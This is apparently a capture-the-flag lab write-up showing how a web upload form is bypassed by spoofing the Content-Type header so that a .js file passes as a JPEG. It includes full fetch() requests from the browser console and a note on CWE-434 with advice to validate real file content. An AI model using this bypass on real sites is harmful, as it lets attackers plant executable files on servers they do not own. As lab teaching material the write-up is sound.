# Uploading a script as an image

On the page `http://IP/?page=upload` (the **Add image** button), you can upload a script and make it look like an image.  
How can this be done?

## 1. Checking the allowed format

We try to upload images in different formats. We find that the page accepts JPEG. Then we look at what a successful request looks like:

```bash
fetch("http://IP/?page=upload", {
  "headers": {
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryJvC1a8Zej7QK5Ogp",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "http://IP/?page=upload",
  "body": "------WebKitFormBoundaryJvC1a8Zej7QK5Ogp\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n------WebKitFormBoundaryJvC1a8Zej7QK5Ogp\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"<filename>.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundaryJvC1a8Zej7QK5Ogp\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n------WebKitFormBoundaryJvC1a8Zej7QK5Ogp--\r\n",
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});
```

## 2. Looking at the request body

- `headers["content-type"]` tells the server how the request body is encoded. `multipart/form-data` is used for a form with different data types and files. This content type splits the data into parts with a unique `boundary` string. Each part has its own headers, including its own `Content-Type`. Different browsers can create different boundary strings.
- `headers["upgrade-insecure-requests"]` is a header that tells the server that the client would rather get answers over HTTPS.
- `referrer` shows from which page the request is sent.
- `"mode": "cors"` means CORS mode is on, so cross-origin checks are used.
- `"credentials": "omit"` means credentials are not sent with this request.
- `body` is a string with separators; we care about the file part. We have:
  - `name="uploaded"` — the name of the input field;
  - `filename="<filename>.jpg"` — the file name;
  - `Content-Type: image/jpeg` — the content type.

## 3. Working with the Content-Type header

We check if images can have different values in this header. Yes, they can:

- `image/jpeg`
- `image/png` → <https://wiki.midrangedynamics.com/manuals/MDRest4i/manual/content-types/>

When an image is uploaded in the browser with the button, the browser sets this header by itself. Because of this, you cannot directly upload a script that way — in that case, `Content-Type` would be set as `application/javascript` or `text/javascript`.

We try to send the same request through the console, keep `Content-Type: image/jpeg`, but change the file type to `.js`.

```bash
const res = await fetch("http://IP/?page=upload", {
  "headers": {
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundarygsnTcSeS3o1TbyAG",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "http://IP/?page=upload",
  "body": "------WebKitFormBoundarygsnTcSeS3o1TbyAG\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n------WebKitFormBoundarygsnTcSeS3o1TbyAG\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"<filename>.js\"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundarygsnTcSeS3o1TbyAG\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n------WebKitFormBoundarygsnTcSeS3o1TbyAG--\r\n",
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});

console.log(await res.text())
```

The server returns an HTML page with the flag.

With this method, it is possible to upload or send dangerous file types (scripts), which can later be run by opening a URL.
This weakness shows that we should not trust only the `Content-Type` header. We must check the real file content, either on the client side or on the server side, depending on the web app design, info:
- https://cwe.mitre.org/data/definitions/434.html

## Notes on JavaScript

- The `fetch` method is asynchronous: it does not return the server response itself, but a `Promise` object. To wait for the response, `await` is used.
- With `await`, you get a special `Response` object. It has methods like `text()` and `json()`. These methods are also asynchronous, so they also need `await`.
- `console.log` is a way to print data in the console.